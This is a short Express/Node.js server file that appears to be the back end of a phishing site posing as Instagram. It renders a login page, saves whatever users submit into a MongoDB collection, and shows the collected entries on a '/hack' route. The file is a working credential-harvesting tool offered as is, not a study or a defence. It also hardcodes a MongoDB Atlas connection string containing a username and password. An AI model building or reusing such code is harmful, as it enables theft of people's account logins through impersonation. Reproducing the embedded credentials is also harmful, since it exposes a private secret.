import express from 'express'
import handlebars from 'express-handlebars'
import mongoose  from 'mongoose'
import __dirname from './utils.js'
import userService from './models/User.js'
const connection = mongoose.connect('mongodb+srv://diego:toyboyaco07@diegocastcluster.9lpsglb.mongodb.net/Instagram?retryWrites=true&w=majority')
const app = express()
const PORT = process.env.PORT || 8080
app.use(express.json())
app.use(express.text())
app.engine('handlebars', handlebars.engine());
app.set('view engine', 'handlebars');
app.set('views',__dirname + '/views')
app.use(express.static(__dirname+'/public'))

const server = app.listen(PORT,()=>{
    console.log(`Escuchanmdo en ${PORT}`)
})

app.get('/',async(req,res)=>{
    res.render('login')
})

app.post('/login',async(req,res)=>{
    let user = req.body
    await userService.updateMany({id:10000},{$push:{users:user}})
    console.log("Agregado")
})

app.get('/hack',async(req,res)=>{
    let data = await userService.find({id:10000},{_id:0,users:1})
    let user = data[0].users
    res.render('hack',{user})
})

